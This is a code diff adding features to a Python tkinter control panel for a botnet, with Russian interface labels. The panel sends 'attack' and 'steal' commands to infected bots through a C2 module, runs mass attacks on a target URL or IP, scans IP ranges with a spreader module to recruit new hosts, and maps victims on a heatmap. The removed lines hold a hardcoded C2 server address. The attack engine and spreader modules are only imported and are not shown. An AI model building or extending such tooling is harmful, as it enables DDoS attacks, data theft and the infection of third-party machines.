@@ -1,13 +1,11 @@
 import tkinter as tk
 from tkinter import ttk, messagebox, simpledialog
-import json
-import os
-import threading
-import folium
-import webbrowser
+import json, os, threading
+import folium, webbrowser
 from botnet.c2 import broadcast_command
 from engine.attack import AsyncAttackEngine
 from utils.logger import log
+from utils.widgets import ToolTip
 
 class BotnetTab(tk.Frame):
     def __init__(self, parent):
@@ -17,33 +15,74 @@ class BotnetTab(tk.Frame):
         self.load_bots()
 
     def build_ui(self):
-        control_frame = tk.Frame(self)
-        control_frame.pack(fill=tk.X, padx=5, pady=5)
-        tk.Button(control_frame, text="Обновить список", command=self.load_bots).pack(side=tk.LEFT, padx=2)
-        tk.Button(control_frame, text="Массовая атака", command=self.mass_attack).pack(side=tk.LEFT, padx=2)
-        tk.Button(control_frame, text="Обновить агент на VPS", command=self.update_agent_vps).pack(side=tk.LEFT, padx=2)
-        tk.Button(control_frame, text="Масс-сканер", command=self.mass_scanner).pack(side=tk.LEFT, padx=2)
-        tk.Button(control_frame, text="Тепловая карта", command=self.show_heatmap).pack(side=tk.LEFT, padx=2)
+        nb = ttk.Notebook(self)
+        nb.pack(fill=tk.BOTH, expand=True)
 
-        filter_frame = tk.Frame(self)
+        # Вкладка "Список"
+        list_frame = ttk.Frame(nb)
+        nb.add(list_frame, text="Список")
+
+        control_frame = ttk.Frame(list_frame)
+        control_frame.pack(fill=tk.X, padx=5, pady=5)
+        refresh_btn = ttk.Button(control_frame, text="Обновить", command=self.load_bots)
+        refresh_btn.pack(side=tk.LEFT, padx=2)
+        ToolTip(refresh_btn, "Считать bots.json заново")
+        mass_btn = ttk.Button(control_frame, text="Массовая атака", command=self.mass_attack)
+        mass_btn.pack(side=tk.LEFT, padx=2)
+        ToolTip(mass_btn, "Отправить команду атаки всем ботам")
+        scan_btn = ttk.Button(control_frame, text="Масс-сканер", command=self.mass_scanner)
+        scan_btn.pack(side=tk.LEFT, padx=2)
+        ToolTip(scan_btn, "Просканировать сеть на уязвимые узлы")
+
+        filter_frame = ttk.Frame(list_frame)
         filter_frame.pack(fill=tk.X, padx=5)
-        tk.Label(filter_frame, text="Фильтр:").pack(side=tk.LEFT)
-        self.filter_entry = tk.Entry(filter_frame, width=30)
+        ttk.Label(filter_frame, text="Фильтр:").pack(side=tk.LEFT)
+        self.filter_entry = ttk.Entry(filter_frame, width=30)
         self.filter_entry.pack(side=tk.LEFT, padx=5)
         self.filter_entry.bind("<KeyRelease>", lambda e: self.apply_filter())
 
         columns = ("ID", "IP", "OS", "Status", "Bandwidth")
-        self.tree = ttk.Treeview(self, columns=columns, show="headings")
+        self.tree = ttk.Treeview(list_frame, columns=columns, show="headings")
         for col in columns:
             self.tree.heading(col, text=col, command=lambda c=col: self.sort_by(c))
             self.tree.column(col, width=120)
         self.tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        self.tree.bind("<Button-3>", self.show_context_menu)
 
-        self.progress = ttk.Progressbar(self, mode="indeterminate")
+        # Контекстное меню
+        self.context_menu = tk.Menu(self, tearoff=0)
+        self.context_menu.add_command(label="Атаковать", command=self.context_attack)
+        self.context_menu.add_command(label="Сбор данных", command=self.context_steal)
+        self.context_menu.add_command(label="Обновить плагин", command=self.context_update_plugin)
+
+        self.progress = ttk.Progressbar(list_frame, mode="indeterminate")
         self.progress.pack(fill=tk.X, padx=5, pady=2)
 
-        self.status_label = tk.Label(self, text="Ботов: 0")
+        self.status_label = ttk.Label(list_frame, text="Ботов: 0")
         self.status_label.pack(anchor=tk.W, padx=5)
+
+        # Вкладка "Карта"
+        map_frame = ttk.Frame(nb)
+        nb.add(map_frame, text="Карта")
+        heat_btn = ttk.Button(map_frame, text="Показать тепловую карту", command=self.show_heatmap)
+        heat_btn.pack(pady=20)
+        ToolTip(heat_btn, "Показать ботов на карте (нужны lat/lon в bots.json)")
+
+        # Вкладка "P2P"
+        p2p_frame = ttk.Frame(nb)
+        nb.add(p2p_frame, text="P2P")
+        self.p2p_tree = ttk.Treeview(p2p_frame, columns=("Node ID","IP","Port"), show="headings")
+        self.p2p_tree.heading("Node ID", text="Node ID")
+        self.p2p_tree.heading("IP", text="IP")
+        self.p2p_tree.heading("Port", text="Порт")
+        self.p2p_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        p2p_btn_frame = ttk.Frame(p2p_frame)
+        p2p_btn_frame.pack()
+        ttk.Button(p2p_btn_frame, text="Обновить узлы", command=self.refresh_p2p).pack(side=tk.LEFT, padx=5)
+        ttk.Label(p2p_btn_frame, text="Поиск узла:").pack(side=tk.LEFT)
+        self.p2p_search_entry = ttk.Entry(p2p_btn_frame, width=20)
+        self.p2p_search_entry.pack(side=tk.LEFT, padx=5)
+        ttk.Button(p2p_btn_frame, text="Искать", command=self.search_p2p).pack(side=tk.LEFT)
 
     def load_bots(self):
         if os.path.exists("bots.json"):
@@ -93,6 +132,40 @@ class BotnetTab(tk.Frame):
         self.bot_data.sort(key=lambda b: str(b.get(col.lower(), "")))
         self.populate_tree()
 
+    def show_context_menu(self, event):
+        item = self.tree.identify_row(event.y)
+        if item:
+            self.tree.selection_set(item)
+            self.context_menu.post(event.x_root, event.y_root)
+
+    def get_selected_bot(self):
+        selection = self.tree.selection()
+        if selection:
+            values = self.tree.item(selection[0], 'values')
+            return {'id': values[0], 'ip': values[1], 'os': values[2], 'status': values[3], 'bandwidth': values[4]}
+        return None
+
+    def context_attack(self):
+        bot = self.get_selected_bot()
+        if not bot:
+            return
+        target = simpledialog.askstring("Атака ботом", f"Цель для {bot['id']}:")
+        if target:
+            broadcast_command({"action": "attack", "target": target, "bot_id": bot['id']})
+            log(f"Отправлена команда атаки боту {bot['id']} на {target}")
+
+    def context_steal(self):
+        bot = self.get_selected_bot()
+        if bot:
+            broadcast_command({"action": "steal", "bot_id": bot['id']})
+            log(f"Отправлена команда сбора данных боту {bot['id']}")
+
+    def context_update_plugin(self):
+        bot = self.get_selected_bot()
+        if bot:
+            broadcast_command({"action": "update_plugin", "bot_id": bot['id']})
+            log(f"Отправлена команда обновления плагина боту {bot['id']}")
+
     def mass_attack(self):
         target = simpledialog.askstring("Массовая атака", "Цель (URL/IP):")
         if not target:
@@ -107,16 +180,6 @@ class BotnetTab(tk.Frame):
         finally:
             self.progress.stop()
 
-    def update_agent_vps(self):
-        try:
-            with open("avz_settings.json","r") as f:
-                host = json.load(f).get("c2_host", "80.249.146.202")
-        except:
-            host = "80.249.146.202"
-        log(f"Обновление агента на {host}...")
-        # Здесь может быть реальная SSH-команда через ssh_manager
-        messagebox.showinfo("Обновление агента", f"Команда на обновление отправлена на {host}")
-
     def mass_scanner(self):
         ip_range = simpledialog.askstring("Масс-сканер", "IP диапазон (CIDR):")
         if not ip_range:
@@ -125,7 +188,6 @@ class BotnetTab(tk.Frame):
         threading.Thread(target=self._scan_range, args=(ip_range,)).start()
 
     def _scan_range(self, ip_range):
-        # Используем spreader
         import asyncio
         from botnet.spreader import spread_to_range
         loop = asyncio.new_event_loop()
@@ -146,3 +208,19 @@ class BotnetTab(tk.Frame):
             folium.CircleMarker([lat, lon], radius=5, color="red", fill=True).add_to(m)
         m.save("heatmap.html")
         webbrowser.open("heatmap.html")
+
+    # P2P
+    def refresh_p2p(self):
+        # TODO: запросить узлы из Kademlia
+        self.p2p_tree.delete(*self.p2p_tree.get_children())
+        try:
+            from botnet.kademlia_network import KademliaNode
+            # В реальности нужно получить routing_table из узла, но сейчас заглушка
+        except:
+            pass
+
+    def search_p2p(self):
+        key = self.p2p_search_entry.get()
+        if not key:
+            return
+        messagebox.showinfo("P2P Поиск", f"Поиск узла {key}...")
